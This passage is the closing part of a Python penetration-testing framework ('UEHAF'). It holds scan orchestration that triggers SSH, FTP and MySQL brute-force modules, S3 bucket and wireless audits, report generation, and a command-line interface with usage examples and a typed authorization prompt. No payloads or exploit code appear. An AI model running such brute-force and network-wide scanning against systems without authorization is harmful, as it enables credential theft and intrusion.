                    brute_results.extend(self.brute_module.brute_ssh(ip))
                elif port.port == 21 and port.state == "open":
                    brute_results.extend(self.brute_module.brute_ftp(ip))
                elif port.port == 3306 and port.state == "open":
                    brute_results.extend(self.brute_module.brute_mysql(ip))
        
        # Cloud scanning (if cloud resources specified)
        cloud_findings = []
        if options.get('s3_buckets'):
            for bucket in options['s3_buckets']:
                cloud_findings.extend(self.cloud_scanner.scan_aws_s3(bucket))
        
        # Create comprehensive result
        result = HostResult(
            ip=ip,
            hostname=hostname,
            ports=ports,
            web_vulns=web_vulns,
            api_endpoints=api_endpoints,
            exploits=exploits,
            brute_results=brute_results,
            cloud_findings=cloud_findings,
            ssl_info=ssl_info,
            os_guess=os_guess
        )
        
        self.results.append(result)
        return result
    
    def scan_wireless(self, interface: str = "wlan0") -> Dict:
        """Perform wireless network audit"""
        print(f"\n{'='*70}")
        print(f"[*] WIRELESS NETWORK AUDIT")
        print(f"{'='*70}")
        
        networks = self.wireless_auditor.scan_wifi(interface)
        report = self.wireless_auditor.generate_wifi_report()
        
        print(f"\n[+] Found {len(networks)} networks")
        print(f"    Open networks: {report['open_networks']}")
        print(f"    WEP networks: {report['wep_networks']}")
        print(f"    Vulnerable networks: {len(report['vulnerable_networks'])}")
        
        return report
    
    def generate_reports(self, basename: str = "uehaf_report"):
        """Generate all report formats"""
        print(f"\n{'='*70}")
        print("[*] Generating Reports...")
        
        self.reporter.generate_json(self.results, basename)
        self.reporter.generate_html(self.results, basename)
        self.reporter.generate_pdf(self.results, basename)
        
        # Summary
        total_hosts = len(self.results)
        total_ports = sum(len(r.ports) for r in self.results)
        total_vulns = sum(len(r.web_vulns) for r in self.results)
        critical_vulns = sum(
            len([v for v in r.web_vulns if v.severity == 'Critical']) 
            for r in self.results
        )
        
        print(f"\n{'='*70}")
        print("[+] SCAN SUMMARY")
        print(f"{'='*70}")
        print(f"    Hosts Scanned:      {total_hosts}")
        print(f"    Open Ports Found:  {total_ports}")
        print(f"    Total Issues:      {total_vulns}")
        print(f"    Critical Issues:   {critical_vulns}")
        print(f"{'='*70}")

# ============================================
# CLI INTERFACE
# ============================================

def main():
    """Command-line interface"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Ultimate Ethical Hacking Automation Framework (UEHAF) v2.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic scan
  python uehaf.py target.com
  
  # Full scan with brute force
  python uehaf.py 192.168.1.1 --brute --full
  
  # Network scan
  python uehaf.py 192.168.1.0/24 --network
  
  # Wireless audit
  python uehaf.py --wireless -i wlan0
  
  # Cloud scan
  python uehaf.py target.com --s3-buckets mybucket,company-data
  
  # API-focused scan
  python uehaf.py api.target.com --api-only

WARNING: Only use on systems you own or have explicit written permission to test!
        """
    )
    
    parser.add_argument('target', nargs='?', help='Target IP, hostname, or CIDR range')
    parser.add_argument('-f', '--full', action='store_true', 
                       help='Full scan (all ports and deep inspection)')
    parser.add_argument('-o', '--output', default='uehaf_report',
                       help='Output filename base')
    parser.add_argument('--network', action='store_true',
                       help='Treat target as network range (CIDR)')
    parser.add_argument('--brute', action='store_true',
                       help='Enable brute force modules')
    parser.add_argument('--wireless', action='store_true',
                       help='Wireless network audit mode')
    parser.add_argument('-i', '--interface', default='wlan0',
                       help='Wireless interface (default: wlan0)')
    parser.add_argument('--s3-buckets', type=str,
                       help='Comma-separated list of S3 buckets to check')
    parser.add_argument('--api-only', action='store_true',
                       help='Focus on API security testing only')
    parser.add_argument('--cloud', action='store_true',
                       help='Enable cloud security scanning')
    
    args = parser.parse_args()
    
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║                                                                  ║
    ║     🔒 ULTIMATE ETHICAL HACKING AUTOMATION FRAMEWORK v2.0 🔒    ║
    ║                                                                  ║
    ║  ⚠️  FOR AUTHORIZED SECURITY TESTING ONLY - USE RESPONSIBLY    ║
    ║                                                                  ║
    ║  Modules:                                                        ║
    ║    ✓ Network Reconnaissance    ✓ Exploit Framework             ║
    ║    ✓ Advanced Port Scanning    ✓ Brute Force (Rate-Limited)   ║
    ║    ✓ Web Vulnerability Scan    ✓ API Security Testing         ║
    ║    ✓ Cloud Security Audit      ✓ Wireless Network Audit        ║
    ║                                                                  ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    
    # Legal disclaimer
    print("="*70)
    print("LEGAL DISCLAIMER")
    print("="*70)
    print("This tool is for authorized security testing only.")
    print("Unauthorized access to computer systems is ILLEGAL.")
    print("You must have explicit written permission to scan any target.")
    print("="*70)
    
    confirm = input("\nDo you have proper authorization? (yes/no): ")
    if confirm.lower() != 'yes':
        print("[-] Exiting. Obtain proper authorization first.")
        sys.exit(1)
    
    # Initialize framework
    uehaf = UEHAF()
    
    # Wireless mode
    if args.wireless:
        uehaf.scan_wireless(args.interface)
        return
    
    # Validate target
    if not args.target:
        print("[-] Error: Target required (unless using --wireless)")
        sys.exit(1)
    
    # Build options
    options = {
        'enable_brute': args.brute,
        's3_buckets': args.s3_buckets.split(',') if args.s3_buckets else [],
        'api_only': args.api_only
    }
    
    # Run scan
    if args.network:
        import ipaddress
        try:
            network = ipaddress.ip_network(args.target, strict=False)
            hosts = list(network.hosts())[:254]
            print(f"[*] Scanning network: {args.target} ({len(hosts)} hosts)")
            for host in hosts:
                uehaf.scan_target(str(host), options)
        except ValueError as e:
            print(f"[-] Invalid network: {e}")
            sys.exit(1)
    else:
        uehaf.scan_target(args.target, options)
    
    # Generate reports
    uehaf.generate_reports(args.output)
    
    print(f"\n[+] Assessment complete! Reports saved to ./scan_results/")

if __name__ == "__main__":
    main()
